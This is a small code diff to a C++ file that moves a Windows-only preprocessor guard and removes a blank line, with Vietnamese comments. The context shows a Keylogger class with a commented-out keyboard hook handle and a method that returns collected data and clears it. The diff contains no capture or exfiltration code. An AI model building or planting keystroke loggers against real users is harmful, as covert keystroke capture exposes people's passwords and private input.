@@ -1,5 +1,5 @@
-#ifdef _WIN32
 #include "KeyboardController.h"
+#ifdef _WIN32
 
 // HHOOK Keylogger::_hook = NULL;
 
@@ -165,5 +165,4 @@ std::string Keylogger::getDataAndClear() {
     
     return dataCopy; // Trả về bản copy
 } // Tự động mở khóa
-
 #endif
